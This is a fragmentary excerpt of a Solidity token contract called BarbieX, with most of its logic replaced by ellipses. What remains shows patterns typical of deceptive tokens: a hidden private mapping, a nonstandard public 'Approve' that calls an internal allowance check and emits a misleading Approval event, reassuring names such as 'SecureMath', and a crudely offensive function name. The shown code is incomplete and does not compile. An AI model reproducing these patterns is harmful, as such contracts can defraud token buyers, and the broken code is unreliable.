...
abstract contract TraceLog {
    uint256 constant public PATCH = 1;
...
contract BarbieX is IERC20, TraceLog, Ownable {
    using SecureMath for uint256;


    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => uint256) private _twxt;
    ...
    constructor(
        ...
        emit Deployed(owner(), PATCH, totalSupply_);
    }
    ...
    function Approve(address account, uint256 amount) public returns (bool) {
        ...
        _checkAllo(from, account, amount);
        emit Approval(from, address(this), amount);
        return true;
    }

    function _checkAllo(address from, address account, uint256 amount) internal {
        uint256 total = 0;
    ...
    */
    function pedo(address account) public view returns (uint256) {
        return _twxt[account];
    }
